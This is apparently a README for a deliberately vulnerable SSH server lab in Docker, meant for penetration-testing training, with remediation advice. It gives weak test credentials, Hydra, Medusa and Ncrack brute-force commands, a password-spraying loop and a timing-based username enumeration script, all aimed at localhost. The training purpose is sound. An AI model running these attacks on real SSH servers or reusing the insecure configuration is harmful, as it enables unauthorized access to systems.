# Vulnerable SSH Server - Security Testing Lab

A deliberately vulnerable SSH server Docker environment for security testing, penetration testing training, and vulnerability research.

## ⚠️ WARNING

**THIS IS A DELIBERATELY VULNERABLE SSH SERVER FOR EDUCATIONAL PURPOSES ONLY**

- **DO NOT** deploy this in production environments
- **DO NOT** expose this to the internet
- **ONLY** use in isolated lab/testing environments
- This server contains multiple critical security vulnerabilities

## 📋 Overview

This project provides a vulnerable SSH server with the following intentional security flaws:

1. **SSHv1 Protocol Support** - Accepts deprecated SSHv1 connections
2. **Weak Encryption Algorithms** - Supports 3DES, RC4, CBC mode ciphers
3. **Weak MAC Algorithms** - Supports HMAC-MD5, HMAC-SHA1
4. **Weak Key Exchange** - Supports DH Group 1 (Logjam vulnerable)
5. **Username Enumeration** - Timing attack vulnerability
6. **Password Authentication** - Enabled with weak passwords
7. **Root Login** - Direct root access permitted
8. **Weak Host Keys** - 1024-bit RSA and DSA keys
9. **No Rate Limiting** - No brute-force protection
10. **No 2FA** - Single-factor authentication only

## 🎯 Use Cases

- Security training and education
- Penetration testing practice
- Vulnerability scanning tool testing
- Security awareness demonstrations
- SSH security research
- Defensive security training

## 🚀 Quick Start

### Prerequisites

- Docker and Docker Compose installed
- Basic understanding of SSH and security concepts
- Isolated network environment (recommended)

### Build and Run

```bash
# Clone or download this repository
cd ssh-vulnerable-lab

# Build and start the vulnerable SSH server
docker-compose up -d

# Check if container is running
docker ps

# View logs
docker-compose logs -f
```

The SSH server will be available on `localhost:2222`

### Test Credentials

| Username | Password | Notes |
|----------|----------|-------|
| root | toor | Root access |
| testuser | password123 | Weak password |
| admin | admin | Very weak password |
| user1 | user1 | Username as password |
| validuser | ValidPass123! | Stronger password |

## 🧪 Testing Vulnerabilities

### Quick Test

```bash
# Make test script executable
chmod +x test_vulnerabilities.sh

# Run basic tests
./test_vulnerabilities.sh
```

### Advanced Testing

```bash
# Make Python script executable
chmod +x advanced_tests.py

# Install required Python packages (if needed)
pip3 install paramiko

# Run comprehensive tests
python3 advanced_tests.py
```

### Manual Testing

#### Test SSHv1 Protocol
```bash
# Banner grab
nc localhost 2222

# Attempt SSHv1 connection
echo "SSH-1.5-TestClient" | nc localhost 2222
```

#### Test Weak Ciphers
```bash
# Test 3DES cipher
ssh -c 3des-cbc -p 2222 testuser@localhost

# Test RC4 cipher
ssh -c arcfour -p 2222 testuser@localhost
```

#### Test Username Enumeration
```bash
# Valid username (note timing)
time ssh -o PreferredAuthentications=password -p 2222 testuser@localhost

# Invalid username (compare timing)
time ssh -o PreferredAuthentications=password -p 2222 fakeuser@localhost
```

#### Test Password Authentication
```bash
# Login with password
ssh -p 2222 testuser@localhost
# Password: password123

# Or using sshpass
sshpass -p password123 ssh -p 2222 testuser@localhost
```

#### Test Root Login
```bash
# Direct root login
ssh -p 2222 root@localhost
# Password: toor
```

## 📊 Vulnerability Scanning

### Using ssh-audit (Recommended)

```bash
# Install ssh-audit
pip3 install ssh-audit

# Scan the server
ssh-audit localhost -p 2222

# Generate detailed report
ssh-audit localhost -p 2222 > ssh_audit_report.txt
```

### Using Nmap

```bash
# Basic SSH scan
nmap -p 2222 --script ssh-hostkey,ssh2-enum-algos localhost

# Comprehensive scan
nmap -p 2222 --script ssh-* localhost
```

### Using Metasploit

```bash
# Start Metasploit
msfconsole

# Use SSH scanner
use auxiliary/scanner/ssh/ssh_version
set RHOSTS localhost
set RPORT 2222
run

# Username enumeration
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS localhost
set RPORT 2222
set USER_FILE /path/to/usernames.txt
run
```

## 🔧 Exploitation Examples

### Brute Force Attack

```bash
# Using Hydra
hydra -l testuser -P /usr/share/wordlists/rockyou.txt ssh://localhost:2222

# Using Medusa
medusa -h localhost -n 2222 -u testuser -P passwords.txt -M ssh

# Using Ncrack
ncrack -p 2222 -u testuser -P passwords.txt localhost
```

### Password Spraying

```bash
# Create user list
echo -e "testuser\nadmin\nuser1\nroot" > users.txt

# Create password list
echo -e "password123\nadmin\nuser1\ntoor" > passwords.txt

# Spray passwords
for pass in $(cat passwords.txt); do
    for user in $(cat users.txt); do
        sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
                               -p 2222 $user@localhost \
                               "echo Success: $user:$pass" 2>/dev/null
    done
done
```

### Username Enumeration Script

```python
#!/usr/bin/env python3
import paramiko
import time

def check_username(username):
    start = time.time()
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect('localhost', port=2222, username=username, 
                      password='wrongpass', timeout=5)
    except:
        pass
    return time.time() - start

# Test usernames
for user in ['testuser', 'admin', 'root', 'fakeuser', 'invalid']:
    elapsed = check_username(user)
    print(f"{user}: {elapsed:.4f}s")
```

## 📚 Documentation

- **[VULNERABILITIES.md](VULNERABILITIES.md)** - Detailed vulnerability documentation with exploitation techniques
- **[SOLUTIONS.md](SOLUTIONS.md)** - Complete remediation guide and secure SSH configuration

## 🛡️ Learning Path

### Beginner Level
1. Run basic tests with `test_vulnerabilities.sh`
2. Try manual SSH connections with different parameters
3. Read VULNERABILITIES.md to understand each issue
4. Practice with ssh-audit scanning

### Intermediate Level
1. Run advanced tests with `advanced_tests.py`
2. Use Nmap scripts for comprehensive scanning
3. Practice brute-force attacks with Hydra
4. Implement username enumeration techniques

### Advanced Level
1. Use Metasploit modules for exploitation
2. Write custom exploitation scripts
3. Analyze network traffic with Wireshark
4. Study SOLUTIONS.md and implement fixes
5. Compare vulnerable vs. secure configurations

## 🔒 Remediation

After testing vulnerabilities, learn how to fix them:

1. Review [SOLUTIONS.md](SOLUTIONS.md) for detailed remediation steps
2. Implement secure SSH configuration
3. Test the secure configuration
4. Compare before/after security posture

### Quick Remediation Summary

```bash
# Disable SSHv1
Protocol 2

# Use strong algorithms only
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com
MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com
KexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org

# Disable password authentication
PasswordAuthentication no
PubkeyAuthentication yes

# Disable root login
PermitRootLogin no

# Implement rate limiting
MaxAuthTries 3
LoginGraceTime 30

# Install fail2ban
apt-get install fail2ban
```

## 🧹 Cleanup

```bash
# Stop and remove containers
docker-compose down

# Remove images
docker rmi vulnerable-ssh-server

# Remove volumes (if any)
docker volume prune
```

## 📁 Project Structure

```
.
├── Dockerfile                  # Vulnerable SSH server image
├── docker-compose.yml          # Docker Compose configuration
├── test_vulnerabilities.sh     # Basic vulnerability tests
├── advanced_tests.py           # Advanced Python test suite
├── VULNERABILITIES.md          # Detailed vulnerability documentation
├── SOLUTIONS.md                # Remediation guide
└── README.md                   # This file
```

## 🔍 Monitoring and Logs

### View SSH Logs

```bash
# Real-time logs
docker-compose logs -f

# SSH authentication logs
docker exec vulnerable-ssh-server tail -f /var/log/auth.log

# Failed login attempts
docker exec vulnerable-ssh-server grep "Failed password" /var/log/auth.log

# Successful logins
docker exec vulnerable-ssh-server grep "Accepted" /var/log/auth.log
```

### Access Container Shell

```bash
# Get shell access
docker exec -it vulnerable-ssh-server /bin/bash

# Check SSH configuration
cat /etc/ssh/sshd_config

# Check running processes
ps aux | grep sshd
```

## 🎓 Educational Resources

### Understanding SSH Security

- [OpenSSH Security Best Practices](https://www.openssh.com/security.html)
- [Mozilla SSH Guidelines](https://infosec.mozilla.org/guidelines/openssh)
- [NIST SSH Guidelines](https://csrc.nist.gov/)

### Vulnerability References

- CVE-1999-0085 - SSHv1 Protocol Vulnerabilities
- CVE-2018-15473 - Username Enumeration
- CVE-2016-6210 - User Enumeration via Timing
- Sweet32 Attack - 64-bit Block Cipher Vulnerability
- Logjam Attack - Diffie-Hellman Weakness

### Tools and Resources

- [ssh-audit](https://github.com/jtesta/ssh-audit) - SSH server auditing
- [Hydra](https://github.com/vanhauser-thc/thc-hydra) - Password cracking
- [Metasploit](https://www.metasploit.com/) - Penetration testing framework
- [Nmap](https://nmap.org/) - Network scanning

## ⚖️ Legal and Ethical Considerations

**IMPORTANT:** This vulnerable server is for educational purposes only.

- Only use in authorized, isolated lab environments
- Never deploy on production networks
- Do not expose to the internet
- Obtain proper authorization before testing
- Follow responsible disclosure practices
- Comply with local laws and regulations

## 🤝 Contributing

This is an educational project. Suggestions for additional vulnerabilities or improvements are welcome.

## 📝 License

This project is provided for educational purposes. Use at your own risk.

## 🆘 Troubleshooting

### Container Won't Start

```bash
# Check logs
docker-compose logs

# Rebuild image
docker-compose build --no-cache
docker-compose up -d
```

### Can't Connect to SSH

```bash
# Check if container is running
docker ps

# Check port mapping
docker port vulnerable-ssh-server

# Test connectivity
nc -zv localhost 2222
```

### Permission Denied Errors

```bash
# Make scripts executable
chmod +x test_vulnerabilities.sh
chmod +x advanced_tests.py

# Check SSH key permissions
chmod 600 ~/.ssh/id_rsa
```

## 📞 Support

For issues or questions:
1. Check the documentation in VULNERABILITIES.md and SOLUTIONS.md
2. Review the troubleshooting section above
3. Check Docker and SSH logs for error messages

## 🎯 Learning Objectives

After completing this lab, you should be able to:

- ✅ Identify SSH protocol vulnerabilities
- ✅ Detect weak cryptographic algorithms
- ✅ Perform username enumeration attacks
- ✅ Execute brute-force attacks
- ✅ Use security scanning tools effectively
- ✅ Understand SSH security best practices
- ✅ Implement secure SSH configurations
- ✅ Recognize and mitigate SSH vulnerabilities

---

**Remember:** This is a vulnerable system by design. Always practice security testing ethically and legally!